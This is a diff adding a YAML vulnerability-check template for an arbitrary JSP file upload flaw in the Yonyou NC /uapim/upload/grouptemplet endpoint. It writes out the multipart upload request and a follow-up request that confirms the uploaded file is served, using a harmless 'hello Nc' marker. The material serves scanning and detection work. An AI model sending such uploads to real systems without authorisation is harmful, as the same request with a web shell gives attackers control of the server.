@@ -1,0 +1,55 @@
+app: 用友软件
+query: app:"用友软件"
+meta:
+  name: 用友NC uapim接口处存在任意文件上传漏洞
+  level: 4
+  tags:
+  - file_upload
+  description: 文件上传漏洞是指当一个应用程序允许用户上传文件到服务器时，由于缺乏足够的安全措施，攻击者能够上传包含恶意代码的文件，进而执行未授权的操作或获取对系统的控制权。这种漏洞特别危险，因为它可以直接导致服务器被完全接管。
+  homepage: ""
+  author: X prism
+  references: ""
+  solution: 安装补丁、升级至最新版
+  create_at: "2024-07-13 00:43:35"
+  available: false
+  steps:
+    variable: []
+    verify_steps:
+      type: and
+      verify:
+      - request:
+          method: POST
+          path: /uapim/upload/grouptemplet?groupid=nc&fileType=jsp
+          redirect: true
+          header:
+          - ' Content-type': multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ
+          params: |-
+            ------WebKitFormBoundaryEXmnamw5gVZG9KAQ
+            Content-Disposition: form-data; name="file"; filename="xxx.jsp"
+            Content-Type: application/octet-stream
+
+            hello Nc
+            ------WebKitFormBoundaryEXmnamw5gVZG9KAQ--
+        response:
+        - name: code
+          value: "200"
+          type: equals
+      - request:
+          method: GET
+          path: /uapim/static/pages/nc/head.jsp
+          redirect: true
+          header: []
+          params: ""
+        response:
+        - name: code
+          value: "200"
+          type: equals
+        - name: body
+          value: hello Nc
+          type: contains
+    exploit_steps:
+      type: ""
+      params:
+        name: ""
+        type: input
+        value: ""
